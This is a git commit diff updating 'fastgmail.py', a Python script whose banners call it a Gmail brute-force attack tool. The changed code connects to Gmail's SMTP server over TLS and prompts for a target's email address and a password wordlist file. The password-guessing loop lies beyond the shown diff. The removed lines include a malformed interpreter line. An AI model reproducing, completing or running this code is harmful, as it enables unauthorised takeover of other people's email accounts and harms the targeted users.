a588188ea4d9c062262c417b0561cd544d98c4a9
BLACK-KILLER <63947251+ShuBhamg0sain@users.noreply.github.com>
2021-01-25 09:43:02 +0530

    Update fastgmail.py

--- fastgmail.py
+++ fastgmail.py
@@ -1,26 +1,19 @@
 import smtplib
-/usr/bin/python
-from __future__ import absolute_import
-from __future__ import print_function
-from six.moves import input
-import os
-os.system('clear')
-os.system("figlet -f pagga '      Gmail      ' | lolcat")
-os.system("figlet -f pagga ' Brute-Force ' | lolcat")
-os.system("figlet -f pagga '      Attack      ' | lolcat")
-print('''
-==================================
-	|      [Gmail] ==> 2             |
-	|--------------------------------|
-	| Instagram @shubham_g0sain      |
-	| CoDeD By ShuBhamg0sain         |
-	|--------------------------------|
 
-	''')
-import smtplib
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
+
+
+print('''
+===========================================================
+	    |      [Gmail] ==> 2             |
+	    |--------------------------------|
+	    | Instagram @shubham_g0sain      |
+	    | CoDeD By ShuBhamg0sain         |
+	    |--------------------------------|
+===========================================================
+	''')
 
 user = raw_input("Enter the target's email address: ")
 passwfile = raw_input("Enter the password file name: ")
